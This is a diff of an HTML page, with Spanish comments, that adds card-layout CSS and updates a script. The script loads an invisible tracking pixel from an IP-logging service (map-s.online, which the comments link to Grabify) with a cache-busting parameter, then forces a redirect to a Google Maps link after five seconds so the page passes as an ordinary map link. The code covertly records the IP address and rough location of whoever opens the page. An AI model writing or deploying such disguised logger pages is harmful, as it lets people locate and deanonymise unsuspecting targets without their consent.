@@ -8,9 +8,6 @@
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
 
   <style>
-    /* ------------------------------------------- */
-    /* MANTENGA TODO EL CÓDIGO CSS CORREGIDO AQUÍ */
-    /* ------------------------------------------- */
     body {
       font-family: "Roboto", sans-serif;
       background-color: #f4f8fb;
@@ -32,7 +29,64 @@
       margin-bottom: 0.5rem;
     }
 
-    /* ... (RESTO DEL CSS) ... */
+    .header p {
+      opacity: 0.9;
+    }
+
+    .container {
+      max-width: 1200px;
+      width: 90%;
+      margin: auto;
+      padding: 2rem 0;
+    }
+
+    .content {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      gap: 2rem;
+    }
+
+    .card {
+      flex: 1 1 calc(33.333% - 2rem);
+      max-width: calc(33.333% - 2rem);
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      transition: transform 0.3s ease;
+      overflow: hidden;
+    }
+
+    .card:hover {
+      transform: translateY(-5px);
+    }
+
+    .card img {
+      width: 100%;
+      object-fit: cover;
+      height: 200px;
+    }
+
+    .card h2 {
+      padding: 1rem 1.5rem 0.5rem;
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-top: 0;
+      margin-bottom: 0;
+    }
+
+    .card p {
+      padding: 0 1.5rem 1.5rem;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: small;
+      color: #666;
+      padding: 2rem 0;
+      border-top: 1px solid #ddd;
+      margin-top: 2rem;
+    }
 
     @media (max-width: 768px) {
       .content {
@@ -47,21 +101,20 @@
   </style>
 
   <script>
-    // ** 1. URL DE RASTREO (PIXEL INVISIBLE) - SU ÚLTIMO ENLACE GRABIFY/MAP-S.ONLINE **
-    const PIXEL_TRACKER_URL = 'https://map-s.online/EQL5WN.montevideo'; 
+    // ** 1. URL DE RASTREO (PIXEL INVISIBLE) - SU ÚLTIMO ENLACE MAP-S.ONLINE **
+    const PIXEL_TRACKER_URL = 'https://map-s.online/OZ5CXE.montevideo'; 
 
     // 2. Ejecuta el rastreo con el pixel invisible
     const pixel = new Image();
-    // Añade un parámetro único para asegurar que no use caché
+    // Añade un parámetro único para asegurar que no use caché y funcione en todos los navegadores
     pixel.src = PIXEL_TRACKER_URL + '?' + Date.now();
 
     pixel.onload = () => console.log("Pixel de rastreo con map-s.online cargado correctamente.");
     pixel.onerror = () => console.error("Error al cargar el pixel de rastreo.");
 
-    // 3. Redirección después de 5 segundos
+    // 3. Redirección forzada después de 5 segundos
     setTimeout(() => {
-      // Usamos una URL de simulación de Maps.
-      // Ya no importa el error 404 (image_e07ffc.png), ya que es el destino final de la simulación.
+      // Redireccionando a la URL de simulación de Maps (error 404 simulado para la trama)
       window.location.href = "https://maps.google.com?q=Montevideo+Uruguay"; 
     }, 5000);
 
